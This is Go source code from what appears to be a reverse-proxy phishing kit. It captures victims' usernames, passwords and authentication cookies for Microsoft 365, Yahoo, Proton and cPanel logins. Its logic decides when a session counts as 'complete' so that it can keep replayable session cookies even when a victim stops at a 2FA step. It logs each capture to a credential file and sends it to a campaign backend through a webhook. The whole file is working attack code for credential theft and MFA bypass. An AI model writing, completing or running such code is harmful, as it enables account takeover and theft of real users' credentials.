package main

import (
	"fmt"
	"net/http"
	"os"
	"sync"
)

// fileMu serializes appends to the credential log (multiple capture goroutines).
var fileMu sync.Mutex

// MarkDone thread-safely flags the session complete.
func (s *Session) MarkDone() {
	s.mu.Lock()
	s.IsDone = true
	s.mu.Unlock()
}

// ══════════════════════════════════════════════════════════
//  AUTH TOKEN CAPTURE
// ══════════════════════════════════════════════════════════

func captureAuthTokens(resp *http.Response, s *Session, target *Target) {
	if s == nil {
		return
	}

	capturedAny := false
	cookies := resp.Cookies()
	for _, ck := range cookies {
		if ck.Value == "" {
			continue
		}
		if s.ReachedService || target.AuthTokenNames[ck.Name] {
			s.AddToken(ck.Name, ck.Value) // thread-safe
			capturedAny = true
			fmt.Printf("[+] [%d] [%s] AUTH TOKEN: %s = %s\n",
				s.Index, target.Name, ck.Name, truncate(ck.Value, 40))
		}
	}

	// Consistent snapshot for the completion decision (Username/Password/tokens
	// may be written concurrently by the DOM-capture handler).
	username, password, _, tokens, alreadyDone := s.Snapshot()

	if !alreadyDone && isSessionComplete(target, password, s.ReachedService, tokens, capturedAny) {
		s.MarkDone()
		fmt.Printf("\n[!!!] [%d] [%s] SESSION COMPLETE — TOKENS CAPTURED\n", s.Index, target.Name)
		fmt.Printf("[!!!] Username: %s\n", username)
		fmt.Printf("[!!!] Password: %s\n", password)
		fmt.Printf("[!!!] Tokens:   %d cookies captured\n\n", len(tokens))
		saveTokens(s, target)
	}
}

func isSessionComplete(target *Target, password string, reachedService bool, tokens map[string]string, capturedAny bool) bool {
	// Microsoft 365: complete on the ESTSAUTH session cookie.
	if target.Name == "Microsoft 365" {
		_, ok := tokens["ESTSAUTH"]
		return ok
	}

	// Explicit completion cookies take PRECEDENCE: if the target names specific
	// cookies that prove a real login (e.g. Yahoo's Y/T), complete the moment one
	// lands — regardless of whether the post-login service page was ever reached.
	// Victims frequently stop at a 2FA / passkey upsell and never hit the mailbox,
	// so gating purely on reachedService would drop the replay-grade cookies.
	if len(target.CompletionCookies) > 0 {
		if password == "" {
			return false
		}
		for _, c := range target.CompletionCookies {
			if v, ok := tokens[c]; ok && v != "" && v != "Disabled" {
				return true
			}
		}
		// ← CHANGED: cookies defined but none captured yet. Service-upstream
		// targets fall back to the service-reached gate — this covers cookie-less
		// flows like Proton, whose access token lives in the JSON body rather than
		// a Set-Cookie, so it would otherwise never complete. Cookie-ONLY targets
		// (cPanel: no ServiceUpstream) do NOT fall back, so a wrong password there
		// never fires Event 2.
		if target.ServiceUpstream != "" {
			return reachedService && capturedAny
		}
		return false
	}

	// Service-upstream targets WITHOUT explicit completion cookies: complete once
	// the post-login chain reaches the service AND a cookie landed.
	if target.ServiceUpstream != "" {
		return password != "" && reachedService && capturedAny
	}

	// Fallback: a captured password is enough.
	return password != ""
}

// ══════════════════════════════════════════════════════════
//  PERSISTENCE + WEBHOOK
// ══════════════════════════════════════════════════════════

func saveTokens(s *Session, target *Target) {
	username, password, campaignID, tokens, _ := s.Snapshot()

	entry := fmt.Sprintf("\n[%s] [%s] SESSION #%d — FULL CAPTURE\n",
		s.CreatedAt.Format("2006-01-02 15:04:05"), target.Name, s.Index)
	entry += fmt.Sprintf("  Campaign: %s\n", campaignID)
	entry += fmt.Sprintf("  Username: %s\n", username)
	entry += fmt.Sprintf("  Password: %s\n", password)
	entry += fmt.Sprintf("  IP:       %s\n", s.IP)
	entry += fmt.Sprintf("  UA:       %s\n", s.UserAgent)
	entry += fmt.Sprintf("  Tokens:\n")
	for name, value := range tokens {
		entry += fmt.Sprintf("    %s = %s\n", name, value)
	}
	entry += "\n"

	appendToFile(credLogFile, entry)

	// ── EVENT 2 — the login completed and the auth cookies landed. Emit the
	//    full capture (password + tokens + isDone). The Node backend upserts by
	//    sessionId, so this ENRICHES the Event-1 record (adds the cookies, flips
	//    isDone) rather than creating a duplicate. ShouldEmitComplete fires once. ──
	if s.ShouldEmitComplete() {
		emitCapture(s, target)
	}
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

func appendToFile(filename, content string) {
	fileMu.Lock()
	defer fileMu.Unlock()
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(content)
}
